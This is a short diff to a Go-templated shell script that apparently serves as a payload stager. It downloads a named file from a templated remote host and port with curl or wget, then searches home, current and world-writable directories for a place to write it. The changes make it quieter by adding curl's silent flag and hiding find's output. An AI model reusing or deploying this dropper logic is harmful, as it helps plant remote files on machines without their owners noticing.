@@ -6,7 +6,7 @@ export PATH="$PATH:/usr/local/sbin:/usr/local/bin:/usr/bin:/bin:/sbin"
 download () {
 
     if command -v curl &> /dev/null; then
-        curl {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}} -o "$1/{{.Name}}"
+        curl -s {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}} -o "$1/{{.Name}}"
     elif command -v  wget &> /dev/null; then
         wget -O "$1/{{.Name}}" {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}}
     fi
@@ -24,7 +24,7 @@ rm "{{.WorkingDirectory}}/{{.Name}}"
 
 {{else}}
 
-for i in "~" "." $(find / -maxdepth 3 -type d \( -perm -o+w \)); do
+for i in "~" "." $(find / -maxdepth 3 -type d \( -perm -o+w \) &> /dev/null); do
 
     if ! touch $i/{{.Name}}; then 
         continue
